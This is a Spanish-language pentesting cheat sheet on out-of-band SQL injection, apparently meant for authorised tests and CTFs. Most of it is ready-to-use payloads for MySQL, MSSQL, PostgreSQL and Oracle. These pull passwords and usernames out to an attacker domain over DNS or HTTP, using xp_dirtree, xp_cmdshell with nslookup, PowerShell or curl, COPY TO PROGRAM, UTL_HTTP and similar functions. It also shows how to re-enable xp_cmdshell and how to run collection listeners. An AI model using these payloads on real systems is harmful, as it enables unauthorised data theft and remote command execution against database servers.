---
icon: database
---

# Out-of-Band SQLi

En lugar de extraer datos por el canal HTTP de respuesta, los datos se exfiltran por un canal alternativo: DNS o HTTP hacia un servidor controlado por el atacante. Es útil cuando:

* La respuesta no muestra datos (blind)
* El sleep/time-based es poco fiable (latencia, múltiples workers)
* La aplicación es asíncrona o procesa en background

**Flujo:**

```
Payload en la request → DB hace petición DNS/HTTP → Atacante recibe la petición con los datos en el subdominio/path
```

### Infraestructura necesaria

* **Dominio propio** con nameservers controlados, o
* **Burp Collaborator** (Burp Suite Pro), o
* **Interactsh** (open source, gratuito)

```bash
# Instalar interactsh-client (alternativa gratuita a Burp Collaborator)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Iniciar listener
interactsh-client

# Obtendrás un dominio como: abc123.oast.fun
# Cualquier DNS/HTTP que llegue a ese dominio será capturado
```

### MySQL - Out-of-Band

#### load\_file() + UNC path (Windows + MySQL)

```sql
-- Petición DNS/SMB a servidor controlado
' AND load_file(concat('\\\\',database(),'.attacker.com\\share')) -- -
' AND load_file(concat(0x5c5c5c5c, (SELECT password FROM users LIMIT 0,1), 0x2e61747461636b65722e636f6d5c5c7368617265)) -- -
```

> Requiere MySQL en Windows con `secure_file_priv` desactivado. Poco común en configuraciones modernas.

#### SELECT INTO OUTFILE hacia UNC (MySQL en Windows)

```sql
' UNION SELECT NULL,(SELECT password FROM users LIMIT 0,1),NULL INTO OUTFILE '\\\\attacker.com\\share\\out.txt' -- -
```

### MSSQL - Out-of-Band

#### xp\_dirtree (muy común, no requiere SA)

```sql
-- Exfiltrar via DNS
'; exec master..xp_dirtree '\\attacker.com\a' -- -

-- Exfiltrar datos via DNS
'; declare @d varchar(1024); set @d=(SELECT top 1 username FROM users); exec master..xp_dirtree concat('\\',@d,'.attacker.com\a') -- -
```

#### xp\_cmdshell (requiere SA o permisos habilitados)

```sql
-- Habilitar xp_cmdshell si está desactivado
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE -- -

-- Exfiltrar vía DNS
'; exec xp_cmdshell 'nslookup attacker.com' -- -
'; declare @d varchar(1024); set @d=(SELECT top 1 password FROM users); exec xp_cmdshell concat('nslookup ',@d,'.attacker.com') -- -

-- Exfiltrar vía HTTP (curl/powershell)
'; exec xp_cmdshell 'powershell Invoke-WebRequest http://attacker.com/$(whoami)' -- -
```

#### OpenRowSet (MSSQL - HTTP)

```sql
'; exec master..xp_dirtree '//attacker.com/a' -- -
'; SELECT * FROM OPENROWSET('SQLNCLI', 'server=attacker.com;uid=a;pwd=a', 'SELECT 1') -- -
```

### PostgreSQL - Out-of-Band

#### COPY TO/FROM con URL (requiere superusuario)

```sql
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://attacker.com/$(cat /dev/stdin)' -- -
```

#### dblink (requiere extensión instalada)

```sql
-- Crear conexión a servidor externo con datos en el password field
'; SELECT dblink_connect('host=attacker.com user='||(SELECT password FROM users LIMIT 1)||' dbname=a') -- -
```

### Oracle -  Out-of-Band

#### UTL\_HTTP (requiere permisos)

```sql
' AND utl_http.request('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1))=1 -- -
' OR 1=1 AND utl_http.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL -- -
```

#### UTL\_FILE / UTL\_TCP

```sql
-- UTL_TCP para conectar a servidor del atacante
' AND utl_tcp.close_connection(utl_tcp.open_connection('attacker.com',80))=1 -- -
```

#### SYS.DBMS\_LDAP (DNS exfiltration)

```sql
' AND (SELECT DBMS_LDAP.INIT(((SELECT password FROM users WHERE rownum=1)||'.attacker.com'),80) FROM dual) IS NOT NULL -- -
```

#### UTL\_INADDR (DNS lookup con datos)

```sql
' AND utl_inaddr.get_host_address((SELECT password FROM users WHERE rownum=1)||'.attacker.com') IS NOT NULL -- -
```

### Usando Burp Collaborator

```
1. Abrir Burp Suite Pro
2. Burp > Burp Collaborator client
3. Copiar el payload domain: xxxx.burpcollaborator.net
4. Insertar en el payload:
   ' AND load_file(concat('\\\\', (SELECT password FROM users LIMIT 1), '.xxxx.burpcollaborator.net\\a'))-- -
5. Monitorear interacciones en el panel de Collaborator
```

### Usando Interactsh (gratuito)

```bash
# Terminal 1: iniciar cliente
interactsh-client -v

# Output: usando dominio abc123.oast.fun

# Terminal 2: lanzar payload
# ' AND load_file(concat('\\\\', (SELECT database()), '.abc123.oast.fun\\a'))-- -

# Terminal 1: verás la petición DNS entrante con los datos en el subdominio
```

### Tips

> El OOB es la técnica más silenciosa para exfiltrar pero depende de que el servidor de base de datos tenga acceso a internet o a la red del atacante.

> En pentests internos donde el servidor DB no tiene salida a internet, probar OOB hacia un servidor en la red interna controlado por el tester.

> Algunos WAF/FW bloquean las peticiones DNS/HTTP salientes desde el servidor de base de datos. Si OOB falla, volver a técnicas blind.

> Burp Collaborator automatiza la captura. Interactsh es la alternativa open-source recomendada para CTFs y pentests sin licencia Pro.
